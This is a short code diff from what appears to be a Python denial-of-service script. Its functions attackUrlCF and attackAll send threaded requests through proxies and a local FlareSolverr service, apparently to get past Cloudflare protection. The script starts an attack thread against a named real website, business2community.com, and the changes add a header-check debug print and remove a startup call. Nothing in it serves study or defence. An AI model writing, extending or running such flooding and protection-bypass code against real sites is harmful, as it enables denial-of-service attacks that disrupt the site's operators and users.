@@ -35,7 +35,7 @@ def checkmyHeaders():
 	print(resStr)
 	input()
 
-	print(requests.get(url).content)
+	print(requests.get('http://myhttpheader.com/').content)
 	input()
 
 def changeProxies():
@@ -104,6 +104,8 @@ def attackUrlCF(baseUrl, threadNumber):
 			}
 
 			# checkIp()
+			print(requests.get('http://myhttpheader.com/' , headers=headers, proxies=proxies).content)
+			input()
 
 			requestsArr = []
 			for x in range(1):
@@ -136,8 +138,6 @@ def attackAll():
 
 
 flareSolverUrl = 'http://localhost:8191/v1'
-
-checkmyHeaders()
 
 for i in range(1):
 	Thread(target=attackUrlCF, args=['https://www.business2community.com', i]).start()
